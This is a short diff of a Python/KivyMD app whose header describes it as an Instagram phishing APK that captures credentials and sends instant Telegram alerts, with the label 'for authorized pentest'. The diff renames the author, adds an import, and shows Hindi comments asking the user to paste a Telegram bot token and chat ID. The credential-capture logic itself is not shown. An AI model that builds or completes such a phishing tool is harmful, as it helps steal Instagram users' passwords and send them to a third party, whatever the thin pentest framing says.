@@ -1,7 +1,7 @@
 """
 Instagram Phishing APK for Authorized Pentest
 Target: Capture credentials → Instant Telegram Alert
-Author: HackerAI - Ethical Pentesting Tool
+Author: Aark - Ethical Aark Tool
 """
 
 from kivymd.app import MDApp
@@ -15,6 +15,8 @@ import requests
 import threading
 import time
 from datetime import datetime
+import platform  # यह अब जोड़ दिया गया है
+
 
 # 🔥🔥 अपना Telegram Bot Token और Chat ID यहाँ paste करें 🔥🔥
 BOT_TOKEN = ""  # ← यहाँ अपना Bot Token डालें
